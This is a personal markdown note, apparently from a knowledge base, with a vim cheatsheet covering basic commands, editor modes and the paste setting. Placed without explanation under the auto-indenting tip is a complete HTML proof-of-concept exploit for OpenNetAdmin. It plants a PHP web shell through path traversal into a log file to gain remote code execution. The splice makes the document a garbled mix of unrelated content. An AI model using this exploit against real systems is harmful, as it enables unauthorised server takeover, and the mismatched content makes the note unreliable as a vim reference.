# ⚙️ vi vim

Tags: #⚙️
Related to:
See also:
Previous: [[Getting Started]]

## Description

Vi IMproved, a programmer's text editor

## Cheatsheet

| Command | Description |
|-|-|
| `vim file` | vim: open `file` with vim |
| `esc+i` | vim: enter `insert` mode |
| `esc` | vim: back to `normal` mode |
| `x` | vim: Cut character |
| `dw` | vim: Cut word |
| `dd` | vim: Cut full line |
| `yw` | vim: Copy word |
| `yy` | vim: Copy full line |
| `p` | vim: Paste |
| `:1` | vim: Go to line number 1. |
| `:w` | vim: Write the file 'i.e. save' |
| `:q` | vim: Quit |
| `:q!` | vim: Quit without saving |
| `:wq` | vim: Write and quit |

## Usage Examples

|Mode|Description|
|:----|:----|
|Normal|In normal mode, all inputs are considered as editor commands. So there is no insertion of the entered characters into the editor buffer, as is the case with most other editors. After starting the editor, we are usually in the normal mode.|
|Insert|With a few exceptions, all entered characters are inserted into the buffer.|
|Visual|The visual mode is used to mark a contiguous part of the text, which will be visually highlighted. By positioning the cursor, we change the selected area. The highlighted area can then be edited in various ways, such as deleting, copying, or replacing it.|
|Command|It allows us to enter single-line commands at the bottom of the editor. This can be used for sorting, replacing text sections, or deleting them, for example.|
|Replace|In replace mode, the newly entered text will overwrite existing text characters unless there are no more old characters at the current cursor position. Then the newly entered text will be added.|

### Learn vim

	vimtutor

### Prevent vim auto-indenting

	vim index.hmtl

```
:set paste		// Prevents vim auto-indenting
				// Note: Pasting in insert mode automatically negates vim auto-indenting

:set nopaste	// Reverts to default
```

```
<!-- Proof of concept code for easy exploitation. Run this and then go to -->
<!-- http://URLHERE/ona/dcm.php?module=mandat0ry for your shell! -->

<center>
<head>
<title>0wned Your Network</title>
<script type="text/javascript">
function changeaction()
{
    document.sploit.action = document.getElementById("url").value;
    alert('Remember, your shell must be accessed via
'+document.getElementById("url").value+'?module=mandat0ry');
}
</script>
</head>
<font size="5">OpenNetAdmin RCE Exploit</font><br />
<font size="2"><i>Now with leet button sploiting action! (oooh,
ahhh!)</i></font><br /><br />
<form action="/" method="post" name="sploit" onsubmit="changeaction()" >
URL: <input id="url" value="http://127.0.0.1/ona/dcm.php" size="50" /><br />
PHP Code to Execute: <input type="text" size="50" name="options[desc]"
value="<?php echo shell_exec($_GET[1]) ?>"/> <br />
<input type="hidden" name="module" value="add_module" />
<input type="hidden" name="options[name]" value="mandat0ry" />
<input type="hidden" name="options[file]"
value="../../../../../../../../../../../var/log/ona.log" />
<input type="submit" value="Exploit!" />
</form>
<b><i>Special thanks to: offsec, twitches, funkenstein, zachzor,
av1dmage, drc, arsinh, and the coders for OpenNetAdmin!</i></b>
</center>
```

### Commands

|Command|Description|
|:----|:----|
|x|Cut character|
|dw|Cut word|
|dd|Cut full line|
|yw|Copy word|
|yy|Copy full line|
|p|Paste|
|:1|Go to line number 1.|
|:w|Write the file, save|
|:q|Quit|
|:q!|Quit without saving|
|:wq|Write and quit|

# References

<iframe width="560" height="315" src="https://www.youtube.com/embed/l8iXMgk2nnY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>